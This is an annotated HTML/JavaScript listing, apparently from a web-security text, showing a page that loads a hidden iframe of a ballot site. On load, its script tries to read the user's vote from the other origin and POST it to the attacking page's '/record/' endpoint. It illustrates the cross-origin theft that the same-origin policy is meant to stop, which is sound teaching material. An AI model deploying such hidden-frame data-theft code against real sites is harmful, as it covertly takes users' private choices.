```py
<html>
  <script>
    function recordVote(){
      const ballot = frames[0].document.getElementById('ballot');   ❶

      const headers = {
        'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8'
      };
      fetch('/record/', {                                           ❷
        method: 'POST',                                             ❷
        headers: headers,                                           ❷
        body: 'vote=' + ballot.value                                ❷
      });                                                           ❷
    };
  </script>
  <body>
    ...

    <iframe src="https://ballot.charlie.com/"                       ❸
            onload="recordVote()"                                   ❹
            style="display: none;">                                 ❺
    </iframe>
  </body>
</html>
```
